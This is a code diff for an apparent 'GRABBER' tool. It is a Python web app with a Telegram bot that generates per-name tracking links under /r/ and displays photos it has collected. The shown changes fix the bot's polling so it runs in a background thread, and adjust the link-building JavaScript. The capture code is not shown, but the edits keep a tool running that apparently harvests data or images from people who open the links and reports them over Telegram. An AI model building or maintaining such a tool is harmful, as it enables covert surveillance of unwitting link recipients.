@@ -6,8 +6,10 @@
 #  Local:  python3 app.py                             (testing)
 #  Fixes:  hardened bot loop (webhook clear, Conflict retry,
 #          visible [tg] logs) — no more silent "Hello World" clash
+#          + polling now runs manually (no signal handlers) so
+#          it works inside a background thread (PTB >= 20)
 # ─────────────────────────────────────────────────────────────
-import os, re, json, time, uuid, threading
+import os, re, json, time, uuid, threading, asyncio
 import datetime as dt
 from pathlib import Path
 import requests
@@ -460,8 +462,24 @@ def run_telegram_bot():
                 bot_app.add_handler(CommandHandler(cmd, fn))
 
             send_telegram("🤖 GRABBER bot online — listening for commands.")
-            print("[tg] polling started", flush=True)
-            bot_app.run_polling(allowed_updates=["message"], drop_pending_updates=True)
+
+            # ── FIX: run polling without signal handlers ──────────────
+            # run_polling()/idle() install SIGINT/SIGTERM/SIGABRT handlers
+            # via loop.add_signal_handler() -> signal.set_wakeup_fd(), which
+            # is only allowed in the MAIN thread. This bot lives in a
+            # background thread, so drive the PTB lifecycle manually and
+            # keep the loop alive with a long sleep instead.
+            async def _run_polling():
+                await bot_app.initialize()
+                await bot_app.start()
+                await bot_app.updater.start_polling(
+                    allowed_updates=["message"], drop_pending_updates=True
+                )
+                print("[tg] polling started", flush=True)
+                while True:
+                    await asyncio.sleep(3600)  # keep event loop running
+
+            asyncio.run(_run_polling())
             print("[tg] polling stopped", flush=True)
             break
 
@@ -577,7 +595,7 @@ document.getElementById("rows").innerHTML=rows;
 var ph="";(d.last_photos||[]).forEach(function(fn){ph+="<img src='/img/"+fn+"'>";});
 document.getElementById("photos").innerHTML=ph;}
 function genLink(){var n=document.getElementById("name").value.trim();if(!n)return;
-var u=d.base_url.replace(/\/$/,"")+"/r/"+n;var a=document.getElementById("out");
+var u=d.base_url.replace(/\\/$/,"")+"/r/"+n;var a=document.getElementById("out");
 a.href=u;a.textContent=u;a.style.display="inline-block";}
 setInterval(load,5000);load();
 </script></div></body></html>"""
